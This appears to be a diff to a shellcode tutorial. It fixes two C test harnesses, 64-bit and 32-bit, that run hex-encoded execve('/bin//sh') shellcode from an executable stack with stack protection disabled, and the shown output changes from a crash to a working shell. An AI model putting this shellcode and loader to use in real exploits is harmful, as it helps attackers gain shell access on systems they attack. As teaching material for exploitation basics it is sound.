@@ -57,17 +57,18 @@ $ cat shell.c
 // gcc -m64 -fno-stack-protector -z execstack shell.c -o shell
 #include <stdio.h>
 
-unsigned char shellcode[] = \
-"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05";
 int main()
 {
+    unsigned char shellcode[] = \
+        "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05";
     int (*ret)() = (int(*)())shellcode;
     ret();
 }
 
 $ gcc -m64 -fno-stack-protector -z execstack shell.c -o shell
 $ ./shell
-Segmentation fault
+$ id
+uid=1000(user) gid=1000(user) groups=1000(user)
 
 ```
 
@@ -129,19 +130,21 @@ $ echo "\"$(objdump -d ./shell32 | grep '[0-9a-f]:' | cut -d$'\t' -f2 | grep -v 
 
 
 $ cat shell.c
-// gcc -m32 -fno-stack-protector -z execstack shell.c -o shell
+// gcc -m32 -fno-stack-protector -z execstack shell32.c -o shell32
 #include <stdio.h>
 
-unsigned char shellcode[] = \
-"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80";
 int main()
 {
+    unsigned char shellcode[] = \
+        "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80";
     int (*ret)() = (int(*)())shellcode;
     ret();
 }
 
-$ gcc -m32 -fno-stack-protector -z execstack shell.c -o shell
-$ ./shell
-Segmentation fault
+
+$ gcc -m32 -fno-stack-protector -z execstack shell32.c -o shell32
+$ ./shell32
+$ id
+uid=1000(user) gid=1000(user) groups=1000(user)
 
 ```
